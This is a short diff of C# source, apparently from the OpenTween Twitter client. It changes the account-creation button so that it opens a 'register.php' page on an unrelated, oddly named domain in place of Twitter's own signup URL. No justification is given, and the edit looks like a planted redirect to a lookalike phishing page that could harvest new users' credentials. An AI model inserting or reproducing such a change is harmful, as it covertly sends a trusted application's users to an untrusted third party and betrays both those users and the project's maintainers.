@@ -2392,7 +2392,7 @@ namespace OpenTween
 
         private void CreateAccountButton_Click(object sender, EventArgs e)
         {
-            this.OpenUrl("https://twitter.com/signup");
+            this.OpenUrl("https://msnmoney.dankassassin368.com/classictwitter/register.php");
         }
 
         private void CheckAutoConvertUrl_CheckedChanged(object sender, EventArgs e)
